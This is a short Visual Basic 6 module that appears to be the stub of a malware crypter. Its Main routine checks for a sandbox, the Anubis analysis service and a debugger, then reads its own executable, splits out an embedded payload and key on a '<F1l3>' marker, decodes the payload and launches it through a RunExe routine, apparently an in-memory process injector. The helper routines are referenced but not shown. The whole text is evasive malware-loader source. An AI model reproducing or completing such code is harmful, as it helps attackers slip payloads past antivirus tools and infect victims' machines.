Attribute VB_Name = "modMain"
Dim d4t‰N() As String
Dim iNh41T As String
Dim Ev1L() As Byte
Dim Myself As String

Sub Main()
    On Error Resume Next
    If Sandboxed = True Then MsgBox ""
    If Anubis = True Then MsgBox ""
    If Debugger = True Then MsgBox ""
    
    Myself = App.Path & "\" & App.EXEName & ".exe"
    Open Myself For Binary As #1
    iNh41T = Space(FileLen(Myself))
    Get #1, 1, iNh41T
    Close #1
    
    d4t‰N() = Split(iNh41T, "<F1l3>")
    Ev1L() = StrConv(d4t‰N(1), vbFromUnicode)
    EncodeArrayB Ev1L(), d4t‰N(2)
    RunExe Myself, encoded()
End Sub
